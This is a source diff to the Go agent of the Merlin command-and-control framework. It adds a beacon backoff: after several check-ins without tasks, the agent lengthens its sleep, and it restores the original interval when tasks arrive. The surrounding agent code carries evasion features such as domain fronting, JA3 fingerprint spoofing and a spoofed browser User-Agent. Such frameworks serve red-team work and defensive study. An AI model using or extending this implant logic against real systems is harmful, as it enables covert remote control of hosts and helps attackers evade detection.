@@ -75,41 +75,46 @@ type merlinClient interface {
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
-	ID            uuid.UUID       // ID is a Universally Unique Identifier per agent
-	Note          string          // Actual agents don't track the note, but this is a placeholder because the struct is copied
-	Platform      string          // Platform is the operating system platform the agent is running on (i.e. windows)
-	Architecture  string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
-	UserName      string          // UserName is the username that the agent is running as
-	UserGUID      string          // UserGUID is a Globally Unique Identifier associated with username
-	HostName      string          // HostName is the computer's host name
-	Ips           []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
-	Pid           int             // Pid is the Process ID that the agent is running under
-	Process       string          // Process is this agent's process name in memory
-	iCheckIn      time.Time       // iCheckIn is a timestamp of the agent's initial check in time
-	sCheckIn      time.Time       // sCheckIn is a timestamp of the agent's last status check in time
-	Version       string          // Version is the version number of the Merlin Agent program
-	Build         string          // Build is the build number of the Merlin Agent program
-	WaitTimeMin   int64           // WaitTimeMin is shortest amount of time in which the agent waits in-between checking in
-	WaitTimeMax   int64           // WaitTimeMax is longest amount of time in which the agent waits in-between checking in
-	PaddingMax    int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
-	MaxRetry      int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
-	FailedCheckin int             // FailedCheckin is a count of the total number of failed check ins
-	Verbose       bool            // Verbose enables verbose messages to standard out
-	Debug         bool            // Debug enables debug messages to standard out
-	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
-	Client        *merlinClient   // Client is an interface for clients to make connections for agent communications
-	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
-	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
-	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
-	RSAKeys       *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
-	PublicKey     rsa.PublicKey   // Public key (of server) used to encrypt messages
-	secret        []byte          // secret is used to perform symmetric encryption operations
-	JWT           string          // Authentication JSON Web Token
-	URL           string          // The C2 server URL
-	Host          string          // HTTP Host header, typically used with Domain Fronting
-	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
-	psk           string          // Pre-Shared Key
-	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
+	ID                 uuid.UUID       // ID is a Universally Unique Identifier per agent
+	Note               string          // Actual agents don't track the note, but this is a placeholder because the struct is copied
+	Platform           string          // Platform is the operating system platform the agent is running on (i.e. windows)
+	Architecture       string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
+	UserName           string          // UserName is the username that the agent is running as
+	UserGUID           string          // UserGUID is a Globally Unique Identifier associated with username
+	HostName           string          // HostName is the computer's host name
+	Ips                []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
+	Pid                int             // Pid is the Process ID that the agent is running under
+	Process            string          // Process is this agent's process name in memory
+	iCheckIn           time.Time       // iCheckIn is a timestamp of the agent's initial check in time
+	sCheckIn           time.Time       // sCheckIn is a timestamp of the agent's last status check in time
+	Version            string          // Version is the version number of the Merlin Agent program
+	Build              string          // Build is the build number of the Merlin Agent program
+	WaitTimeMin        int64           // WaitTimeMin is shortest amount of time in which the agent waits in-between checking in
+	WaitTimeMax        int64           // WaitTimeMax is longest amount of time in which the agent waits in-between checking in
+	PaddingMax         int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	MaxRetry           int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
+	FailedCheckin      int             // FailedCheckin is a count of the total number of failed check ins
+	InactiveCount      int             // InactiveCount is a count of the total number of check ins with no commands
+	InactiveMultiplier int64           // InactiveMultipler is the amount to multiply WaitTime(Min/Max) by when agent goes inactive
+	InactiveThreshold  int             // InactiveThreshold is the number of check ins with no commands before an agent goes inactive
+	ActiveMin          int64           // ActiveMin keeps track of the originally configured WaitTimeMin
+	ActiveMax          int64           // ActiveMax keeps track of the originally configured WaitTimeMax
+	Verbose            bool            // Verbose enables verbose messages to standard out
+	Debug              bool            // Debug enables debug messages to standard out
+	Proto              string          // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
+	Client             *merlinClient   // Client is an interface for clients to make connections for agent communications
+	UserAgent          string          // UserAgent is the user agent string used with HTTP connections
+	initial            bool            // initial identifies if the agent has successfully completed the first initial check in
+	KillDate           int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
+	RSAKeys            *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
+	PublicKey          rsa.PublicKey   // Public key (of server) used to encrypt messages
+	secret             []byte          // secret is used to perform symmetric encryption operations
+	JWT                string          // Authentication JSON Web Token
+	URL                string          // The C2 server URL
+	Host               string          // HTTP Host header, typically used with Domain Fronting
+	pwdU               []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
+	psk                string          // Pre-Shared Key
+	JA3                string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -118,24 +123,28 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		message("debug", "Entering agent.New function")
 	}
 	a := Agent{
-		ID:           uuid.NewV4(),
-		Platform:     runtime.GOOS,
-		Architecture: runtime.GOARCH,
-		Pid:          os.Getpid(),
-		Version:      merlin.Version,
-		WaitTimeMin:  15,
-		WaitTimeMax:  30,
-		PaddingMax:   4096,
-		MaxRetry:     9999,
-		Verbose:      verbose,
-		Debug:        debug,
-		Proto:        protocol,
-		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
-		initial:      false,
-		KillDate:     0,
-		URL:          url,
-		Host:         host,
-		JA3:          ja3,
+		ID:                 uuid.NewV4(),
+		Platform:           runtime.GOOS,
+		Architecture:       runtime.GOARCH,
+		Pid:                os.Getpid(),
+		Version:            merlin.Version,
+		WaitTimeMin:        15,
+		ActiveMin:          15, //This should match WaitTimeMin
+		WaitTimeMax:        30,
+		ActiveMax:          30, //This should match WaitTimeMax
+		PaddingMax:         4096,
+		MaxRetry:           9999,
+		InactiveMultiplier: 5,
+		InactiveThreshold:  6,
+		Verbose:            verbose,
+		Debug:              debug,
+		Proto:              protocol,
+		UserAgent:          "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
+		initial:            false,
+		KillDate:           0,
+		URL:                url,
+		Host:               host,
+		JA3:                ja3,
 	}
 
 	rand.Seed(time.Now().UnixNano())
@@ -408,6 +417,7 @@ func (a *Agent) statusCheckIn() {
 	}
 
 	a.FailedCheckin = 0
+
 	a.sCheckIn = time.Now().UTC()
 
 	if a.Debug {
@@ -427,10 +437,26 @@ func (a *Agent) statusCheckIn() {
 
 	// Used when the message was ServerOK, no further processing is needed
 	if m.Type == "" {
+		//Agent successfully checked in, but no tasks were queued
+		a.InactiveCount++
+		if a.InactiveCount == a.InactiveThreshold {
+			a.InactiveCount = 0
+			a.WaitTimeMin *= a.InactiveMultiplier
+			a.WaitTimeMax *= a.InactiveMultiplier
+			a.sendMessage("POST", a.getAgentInfoMessage())
+		}
 		return
 	}
 
-	_, errR := a.sendMessage("post", m)
+	//Agent successfully checked in and there is a task to perform
+	a.InactiveCount = 0
+	if a.WaitTimeMin != a.ActiveMin {
+		a.WaitTimeMin = a.ActiveMin
+		a.WaitTimeMax = a.ActiveMax
+		a.sendMessage("POST", a.getAgentInfoMessage())
+	}
+
+	_, errR := a.sendMessage("POST", m)
 	if errR != nil {
 		if a.Verbose {
 			message("warn", errR.Error())
@@ -900,12 +926,14 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 
 			if tmin > 0 {
 				a.WaitTimeMin = tmin
+				a.ActiveMin = tmin
 			} else {
 				c.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMin that was not greater than zero:\r\n%s", strconv.FormatInt(tmin, 10))
 				break
 			}
 			if tmax > 0 {
 				a.WaitTimeMax = tmax
+				a.ActiveMax = tmax
 			} else {
 				c.Stderr = fmt.Sprintf("The agent was provided with a WaitTimeMax that was not greater than zero:\r\n%s", strconv.FormatInt(tmax, 10))
 				break
@@ -920,6 +948,26 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 				message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
 			}
 			a.PaddingMax = t
+		case "inactivemultiplier":
+			t, err := strconv.ParseInt(p.Args, 10, 64)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("There was an error changing the agent inactive multiplier:\r\n%s", err.Error())
+				break
+			}
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent inactive multiplier to %d", t))
+			}
+			a.InactiveMultiplier = t
+		case "inactivethreshold":
+			t, err := strconv.Atoi(p.Args)
+			if err != nil {
+				c.Stderr = fmt.Sprintf("There was an error changing the agent inactive threshold:\r\n%s", err.Error())
+				break
+			}
+			if a.Verbose {
+				message("note", fmt.Sprintf("Setting agent inactive threshold to %d", t))
+			}
+			a.InactiveThreshold = t
 		case "initialize":
 			if a.Verbose {
 				message("note", "Received agent re-initialize message")
@@ -1670,17 +1718,21 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 	}
 
 	agentInfoMessage := messages.AgentInfo{
-		Version:       merlin.Version,
-		Build:         build,
-		WaitTimeMin:   a.WaitTimeMin,
-		WaitTimeMax:   a.WaitTimeMax,
-		PaddingMax:    a.PaddingMax,
-		MaxRetry:      a.MaxRetry,
-		FailedCheckin: a.FailedCheckin,
-		Proto:         a.Proto,
-		SysInfo:       sysInfoMessage,
-		KillDate:      a.KillDate,
-		JA3:           a.JA3,
+		Version:            merlin.Version,
+		Build:              build,
+		WaitTimeMin:        a.WaitTimeMin,
+		WaitTimeMax:        a.WaitTimeMax,
+		ActiveMin:          a.ActiveMin,
+		ActiveMax:          a.ActiveMax,
+		InactiveMultiplier: a.InactiveMultiplier,
+		InactiveThreshold:  a.InactiveThreshold,
+		PaddingMax:         a.PaddingMax,
+		MaxRetry:           a.MaxRetry,
+		FailedCheckin:      a.FailedCheckin,
+		Proto:              a.Proto,
+		SysInfo:            sysInfoMessage,
+		KillDate:           a.KillDate,
+		JA3:                a.JA3,
 	}
 
 	baseMessage := messages.Base{
